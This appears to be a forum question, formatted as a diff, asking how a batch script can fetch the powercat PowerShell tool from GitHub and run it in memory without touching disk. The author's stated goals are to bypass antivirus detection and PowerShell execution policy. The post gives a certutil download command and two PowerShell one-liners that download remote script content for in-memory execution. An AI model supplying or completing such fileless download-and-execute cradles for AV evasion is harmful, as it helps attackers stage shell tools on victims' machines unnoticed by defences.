@@ -1,0 +1,23 @@
+In my batch script, I am trying to download and execute a powershell script remotely. Here is the url:
+
+https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
+
+I want to download the file into memory (without touching disk), for several reasons:
+
+    It bypasses AV detection
+    It bypasses Powershell executionpolicy, so there's no need for the powershell -nop -ep bypass that causes AV detection
+    Won't throw unneccessary syntax errors
+    You can directly use functions defined inside the .ps1 script
+
+Obviously i can use certutil:
+
+certutil -urlcache -split -f <url>
+
+but I don't want the file to hit disk, which can cause AV detection.
+The same thing can be done with easily using other languages, like PowerShell:
+
+(New-Object Net.WebClient).DownloadString($url)
+
+OR
+
+(New-Object IO.StreamReader([Net.HttpWebRequest]::Create($url).GetResponse().GetResponseStream())).ReadToEnd()
